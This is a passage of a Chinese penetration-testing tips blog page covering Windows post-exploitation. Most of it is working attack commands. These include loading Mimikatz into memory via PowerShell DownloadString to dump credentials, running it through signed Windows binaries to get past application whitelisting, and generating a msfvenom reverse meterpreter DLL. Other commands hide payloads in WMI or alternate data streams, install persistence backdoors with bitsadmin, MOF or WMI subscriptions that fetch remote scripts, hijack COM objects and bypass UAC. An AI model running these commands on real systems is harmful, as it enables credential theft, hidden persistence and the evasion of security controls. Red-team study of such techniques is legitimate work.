+<p>例如无法捕获用户的屏幕</p>
+<p>2.环境变量有差异</p>
+<p>因此需要降权到当前用户</p>
+<p>降权方法1：使用SelectMyParent.exe</p>
+<p>代码下载地址：<a href="https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/Processauthority.cpp" target="_blank" rel="external">https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/Processauthority.cpp</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/" target="_blank" rel="external">《渗透技巧——程序的降权启动》</a></p>
+<p>降权方法2：使用msdtc</p>
+<p>使用msdtc会以system权限加载oci.dll，但在管理员权限cmd执行：</p>
+<p>msdtc -install</p>
+<p>启动的calc.exe为high权限</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" target="_blank" rel="external">《Use msdtc to maintain persistence》</a></p>
+<hr>
+<h3 id="tips-24-通过命令行能够对windows系统安装winpcap这样就可以在windows跳板上使用nmap和masscan">Tips 24. 通过命令行能够对Windows系统安装WinPcap，这样就可以在Windows跳板上使用nmap和Masscan</h3>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8CMasscan%E5%92%8CNmap/" target="_blank" rel="external">《渗透技巧——Windows平台运行Masscan和Nmap》</a></p>
+<hr>
+<h3 id="tips-25-windows平台执行mimikatz的方法">Tips 25. Windows平台执行mimikatz的方法</h3>
+<h4 id="方法1通过powershell">方法1：通过powershell</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</div></pre></td></tr></table></figure>
+<h4 id="方法2通过installutilexe">方法2：通过InstallUtil.exe</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs</div><div class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《利用白名单绕过360实例》</p>
+<p>《利用白名单绕过限制的更多测试》</p>
+<h4 id="方法3通过regsvr32exe">方法3：通过regsvr32.exe</h4>
+<p><a href="https://gist.githubusercontent.com/subTee/c3d5030bb99aa3f96bfa507c1c184504/raw/24dc0f93f1ebdda7c401dd3890259fa70d23f75b/regsvr32-katz.cs" target="_blank" rel="external">https://gist.githubusercontent.com/subTee/c3d5030bb99aa3f96bfa507c1c184504/raw/24dc0f93f1ebdda7c401dd3890259fa70d23f75b/regsvr32-katz.cs</a></p>
+<p>将mimikatz封装到dll中，通过regsvr32传入参数运行mimkatz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rundll32 katz.dll,EntryPoint log coffee exit</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《Code Execution of Regsvr32.exe》</p>
+<h4 id="方法4通过msbuildexe">方法4：通过msbuild.exe</h4>
+<p>下载xml文件，保存为a.xml：</p>
+<p><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes mimikatz.xml</a></p>
+<p>cmd：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe executes a.xml</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/" target="_blank" rel="external">《Use MSBuild To Do More》</a></p>
+<h4 id="方法5通过csiexe">方法5：通过csi.exe</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe&quot; c:\test\katz.csx</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.4(Use-tracker-to-load-dll-&amp;-Use-csi-to-bypass-UMCI-&amp;-Execute-C-from-XSLT-file)/" target="_blank" rel="external">《Study Notes Weekly No.4(Use tracker to load dll &amp; Use csi to bypass UMCI &amp; Execute C# from XSLT file)》</a></p>
+<h4 id="方法6通过jsvbs脚本">方法6：通过js/vbs脚本</h4>
+<p><a href="https://gist.github.com/subTee/5c636b8736530fb20c3d" target="_blank" rel="external">https://gist.github.com/subTee/5c636b8736530fb20c3d</a></p>
+<p><a href="https://gist.github.com/subTee/b30e0bcc7645c790fcd993cfd0ad622f" target="_blank" rel="external">https://gist.github.com/subTee/b30e0bcc7645c790fcd993cfd0ad622f</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/" target="_blank" rel="external">《利用JS加载.Net程序》</a></p>
+<hr>
+<h3 id="tips-26-windows系统中可供存储和读取payload的位置">Tips 26. Windows系统中可供存储和读取payload的位置</h3>
+<h4 id="方法1wmi">方法1：WMI</h4>
+<p>存储：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,$null)</div><div class="line">$StaticClass.Name = &apos;Win32_Command&apos;</div><div class="line">$StaticClass.Put()</div><div class="line">$StaticClass.Properties.Add(&apos;Command&apos; , $Payload)</div><div class="line">$StaticClass.Put()</div></pre></td></tr></table></figure>
+<p>读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$Payload=([WmiClass] &apos;Win32_Command&apos;).Properties[&apos;Command&apos;].Value</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《WMI Backdoor》</p>
+<h4 id="方法2包含数字签名的pe文件">方法2：包含数字签名的PE文件</h4>
+<p>利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名</p>
+<p>参考：</p>
+<p><a href="https://github.com/3gstudent/Pentest-and-Development-Tips/edit/master/README.md" target="_blank" rel="external">《隐写技巧-在PE文件的数字证书中隐藏Payload》</a></p>
+<h4 id="方法3特殊ads">方法3：特殊ADS</h4>
+<p>(1)…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">type putty.exe &gt; ...:putty.exe</div><div class="line">wmic process call create c:\test\ads\...:putty.exe</div></pre></td></tr></table></figure>
+<p>(2)特殊COM文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</div><div class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</div></pre></td></tr></table></figure>
+<p>(3)磁盘根目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">type putty.exe &gt;C:\:putty.exe </div><div class="line">wmic process call create C:\:putty.exe</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">《Hidden Alternative Data Streams的进阶利用技巧》</a></p>
+<hr>
+<h3 id="tips-27-windows系统中值得搜集的信息">Tips 27. Windows系统中值得搜集的信息</h3>
+<h4 id="1已注册的wmi信息">(1)已注册的WMI信息</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter GET __RELPATH /FORMAT:list</div><div class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list</div><div class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list</div></pre></td></tr></table></figure>
+<p>管理员也许会使用WMI记录攻击者调用WMI的操作，可通过wmic查看，当然通过wmic也能关闭该监控功能</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/" target="_blank" rel="external">《Study Notes Weekly No.1(Monitor WMI &amp; ExportsToC++ &amp; Use DiskCleanup bypass UAC))》</a></p>
+<hr>
+<h3 id="tips-28-windows系统反弹meterpreter的常用方法">Tips 28. Windows系统反弹meterpreter的常用方法</h3>
+<h4 id="方法1通过rundll32加载dll反弹meterpreter">方法1：通过rundll32加载dll反弹meterpreter</h4>
+<p>msf：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_http -f dll LHOST=192.168.174.133 LPORT=8080&gt;./a.dll</div></pre></td></tr></table></figure>
+<p>生成a.dll,然后上传至测试主机</p>
+<p>执行<code>rundll32.exe a.dll,Control_RunDLL</code>，即可上线</p>
+<h4 id="方法2通过cpl反弹meterpreter">方法2：通过cpl反弹meterpreter</h4>
+<p>代码见https://raw.githubusercontent.com/3gstudent/test/master/meterpreter_reverse_tcp.cpp</p>
+<p>生成dll，重命名为cpl，双击执行</p>
+<h4 id="方法3通过powershell反弹meterpreter">方法3：通过powershell反弹meterpreter</h4>
+<p><a href="https://raw.githubusercontent.com/3gstudent/Code-Execution-and-Process-Injection/master/2-CodeExecution-Meterpreter.ps1" target="_blank" rel="external">https://raw.githubusercontent.com/3gstudent/Code-Execution-and-Process-Injection/master/2-CodeExecution-Meterpreter.ps1</a></p>
+<hr>
+<h3 id="tips-29-windows系统加载dll的方法">Tips 29. Windows系统加载dll的方法</h3>
+<h4 id="方法1rundll32">方法1：rundll32</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rundll32 a.dll,EntryPoint</div></pre></td></tr></table></figure>
+<h4 id="方法2regsvr32">方法2：regsvr32</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">regsvr32 a.dll</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《Code Execution of Regsvr32.exe》</p>
+<h4 id="方法3odbcconf">方法3：odbcconf</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">odbcconf.exe /a &#123;regsvr c:\test\odbcconf.dll&#125;</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.3(Use-odbcconf-to-load-dll-&amp;-Get-Exports-&amp;-ETW-USB-Keylogger)/" target="_blank" rel="external">《Study Notes Weekly No.3(Use odbcconf to load dll &amp; Get-Exports &amp; ETW USB Keylogger)》</a></p>
+<h4 id="方法4tracker">方法4：Tracker</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Tracker.exe /d test.dll /c svchost.exe</div></pre></td></tr></table></figure>
+<p>tracker.exe包含微软数字签名，可绕过应用程序白名单的限制</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.4(Use-tracker-to-load-dll-&amp;-Use-csi-to-bypass-UMCI-&amp;-Execute-C-from-XSLT-file)/" target="_blank" rel="external">《Study Notes Weekly No.4(Use tracker to load dll &amp; Use csi to bypass UMCI &amp; Execute C# from XSLT file)》</a></p>
+<h4 id="方法5excelapplication-objects-registerxll-method">方法5：Excel.Application object’s RegisterXLL() method</h4>
+<p>前提：已安装Microsoft Office软件</p>
+<p>1.rundll32</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;x=new%20ActiveXObject(&apos;Excel.Application&apos;);x.RegisterXLL(&apos;C:\\test\\messagebox.dll&apos;);this.close();</div></pre></td></tr></table></figure>
+<p>2.js</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var excel = new ActiveXObject(&quot;Excel.Application&quot;);</div><div class="line">excel.RegisterXLL(&quot;C:\\test\\messagebox.dll&quot;);</div></pre></td></tr></table></figure>
+<p>3.powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$excel = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;))</div><div class="line">$excel.RegisterXLL(&quot;C:\test\messagebox.dll&quot;)</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Excel.Application-object's-RegisterXLL()-method-to-load-dll/" target="_blank" rel="external">《Use Excel.Application object’s RegisterXLL() method to load dll》</a></p>
+<h4 id="方法6xwizardexe">方法6：xwizard.exe</h4>
+<p>复制%windir%\system32\下的xwizard.exe至新目录C:\x</p>
+<p>将msg.dll重命名为xwizards.dll，保存在C:\x</p>
+<p>命令行执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xwizard processXMLFile 1.txt</div></pre></td></tr></table></figure>
+<p>成功加载C:\x\xwizards.dll</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-xwizard.exe-to-load-dll/" target="_blank" rel="external">《Use xwizard.exe to load dll》</a></p>
+<hr>
+<h3 id="tips-30-windows后门">Tips 30. Windows后门</h3>
+<h4 id="方法1bitsadmin">方法1：bitsadmin</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">bitsadmin /create backdoor</div><div class="line">bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe</div><div class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&quot;</div><div class="line">bitsadmin /Resume backdoor</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《Use bitsadmin to maintain persistence and bypass Autoruns》</p>
+<h4 id="方法2mof">方法2：mof</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;)    </div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</div><div class="line">    Name  = &quot;filtP1&quot;;</div><div class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</div><div class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</div><div class="line">            &quot;And TargetInstance.Second = 1&quot;;</div><div class="line">    QueryLanguage = &quot;WQL&quot;;</div><div class="line">&#125;;    </div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">    Name = &quot;consP1&quot;;</div><div class="line">    ScriptingEngine = &quot;JScript&quot;;</div><div class="line">    ScriptText = &quot;GetObject(\&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\&quot;)&quot;;</div><div class="line">&#125;;    </div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">    Consumer   = $Consumer;</div><div class="line">    Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>管理员权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mofcomp test.mof</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p>《WSC、JSRAT and WMI Backdoor》</p>
+<h4 id="方法3wmi">方法3：wmi</h4>
+<p>每隔60秒执行一次notepad.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</div><div class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot;</div><div class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="external">《Study Notes of WMI Persistence using wmic.exe》</a></p>
+<h4 id="方法4userland-persistence-with-scheduled-tasks">方法4：Userland Persistence With Scheduled Tasks</h4>
+<p>劫持计划任务UserTask，在系统启动时加载testmsg.dll</p>
+<p>操作如下：</p>
+<p>在HKEY_CURRENT_USER\Software\Classes\CLSID\下新建项{58fb76b9-ac85-4e55-ac04-427593b1d060}</p>
+<p>接着新建项InprocServer32</p>
+<p>值设定为<code>c:\test\testmsg.dll</code></p>
+<p>testmsg.dll包含如下导出函数：</p>
+<p>DllCanUnloadNow<br>
+DllGetClassObject<br>
+DllRegisterServer<br>
+DllUnregisterServer</p>
+<p>等待用户重新登录</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/" target="_blank" rel="external">《Userland registry hijacking》</a></p>
+<h4 id="方法5netsh">方法5：Netsh</h4>
+<p>helper DLL需要包含导出函数InitHelperDll</p>
+<p>管理员权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh add helper c:\test\netshtest.dll</div></pre></td></tr></table></figure>
+<p>helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/" target="_blank" rel="external">《Netsh persistence》</a></p>
+<h4 id="方法6shim">方法6：Shim</h4>
+<p>常用方式：</p>
+<p>InjectDll<br>
+RedirectShortcut<br>
+RedirectEXE</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="external">《渗透测试中的Application Compatibility Shims》</a></p>
+<h4 id="方法7dll劫持">方法7：dll劫持</h4>
+<p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="external">《DLL劫持漏洞自动化识别工具Rattler测试》</a></p>
+<h4 id="方法8doubleagent">方法8：DoubleAgent</h4>
+<p>编写自定义Verifier provider DLL</p>
+<p>通过Application Verifier进行安装</p>
+<p>注入到目标进程执行payload</p>
+<p>每当目标进程启动，均会执行payload，相当于一个自启动的方式</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/" target="_blank" rel="external">《渗透测试中的Application Verifier(DoubleAgent利用介绍)》</a></p>
+<h4 id="方法9waitforexe">方法9：waitfor.exe</h4>
+<p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/" target="_blank" rel="external">《Use Waitfor.exe to maintain persistence》</a></p>
+<h4 id="方法10appdomainmanager">方法10：AppDomainManager</h4>
+<p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。 如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="external">《Use AppDomainManager to maintain persistence》</a></p>
+<h4 id="方法11office加载项">方法11：Office加载项</h4>
+<p>如果系统已安装office软件，可通过配置Office加载项实现劫持，作为被动后门</p>
+<p>常用利用方式：</p>
+<p>Word WLL</p>
+<p>Excel XLL</p>
+<p>Excel VBA add-ins</p>
+<p>PowerPoint VBA add-ins</p>
+<p>POC：<a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="external">https://github.com/3gstudent/Office-Persistence</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/" target="_blank" rel="external">《Use Office to maintain persistence》</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/" target="_blank" rel="external">《Office Persistence on x64 operating system》</a></p>
+<h4 id="方法12clr">方法12：CLR</h4>
+<p>无需管理员权限的后门，并能够劫持所有.Net程序</p>
+<p>POC:<a href="https://github.com/3gstudent/CLR-Injection" target="_blank" rel="external">https://github.com/3gstudent/CLR-Injection</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="external">《Use CLR to maintain persistence》</a></p>
+<h4 id="方法13msdtc">方法13：msdtc</h4>
+<p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" target="_blank" rel="external">《Use msdtc to maintain persistence》</a></p>
+<h4 id="方法14hijack-caccpropservicesclass-and-mmdeviceenumerator">方法14：Hijack CAccPropServicesClass and MMDeviceEnumerator</h4>
+<p>不需要重启系统，不需要管理员权限</p>
+<p>通过修改注册表实现</p>
+<p>POC：<a href="https://github.com/3gstudent/COM-Object-hijacking" target="_blank" rel="external">https://github.com/3gstudent/COM-Object-hijacking</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/" target="_blank" rel="external">《Use COM Object hijacking to maintain persistence——Hijack CAccPropServicesClass and MMDeviceEnumerator》</a></p>
+<h4 id="方法15hijack-explorerexe">方法15：Hijack explorer.exe</h4>
+<p>不需要重启系统，不需要管理员权限</p>
+<p>通过修改注册表实现</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/" target="_blank" rel="external">《Use COM Object hijacking to maintain persistence——Hijack explorer.exe》</a></p>
+<hr>
+<h3 id="tips-31-uac绕过">Tips 31. UAC绕过</h3>
+<h4 id="方法1use-eventvwrexe-and-registry-hijacking">方法1：use eventvwr.exe and registry hijacking</h4>
+<p>适用：Win7，Win8.1，Win 10</p>
+<p><a href="https://github.com/3gstudent/UAC-Bypass/blob/master/Invoke-EventVwrBypass.ps1" target="_blank" rel="external">https://github.com/3gstudent/UAC-Bypass/blob/master/Invoke-EventVwrBypass.ps1</a></p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="external">《Study Notes of WMI Persistence using wmic.exe》</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/" target="_blank" rel="external">《Userland registry hijacking》</a></p>
+<h4 id="方法2use-sdcltexe">方法2：use sdclt.exe</h4>
+<p>适用Win10</p>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-sdclt.exe-to-bypass-UAC/" target="_blank" rel="external">《Study Notes of using sdclt.exe to bypass UAC》</a></p>
+<h4 id="方法3use-silentcleanup">方法3：use SilentCleanup</h4>
+<p>适用Win8,Win10</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg add hkcu\Environment /v windir /d &quot;cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM &quot;</div><div class="line">schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</div></pre></td></tr></table></figure>
+<p>参考：</p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-SilentCleanup-to-bypass-UAC/" target="_blank" rel="external">《Study Notes of using SilentCleanup to bypass UAC》</a></p>
+<hr>
+<h3 id="tips-32-visual-studio生成的exe或是dll在其他系统使用提示缺少相关dll文件">Tips 32. Visual Studio生成的exe或是dll在其他系统使用，提示缺少相关DLL文件</h3>
+<p>解放方法：</p>
+<p>将程序打包发布</p>
+<p>项目菜单-&gt;项目属性，C/C+±&gt;代码生成-&gt;运行库，选择多线程 (/MT)</p>
+<hr>
+<h3 id="tips-33">Tips 33.</h3>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/08/07/msf/" data-toggle="tooltip" data-placement="top" title="Metasploit">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread"></div>
+                            <script>
+                                /**
+                                *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+                                *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+                                /*
+                                var disqus_config = function () {
+                                this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+                                this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                                };
+                                */
+                                (function() { // DON'T EDIT BELOW THIS LINE
+                                var d = document, s = d.createElement('script');
+                                s.src = 'https://rootclay.disqus.com/embed.js';
+                                s.setAttribute('data-timestamp', +new Date());
+                                (d.head || d.body).appendChild(s);
+                                })();
+                            </script>
+                            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
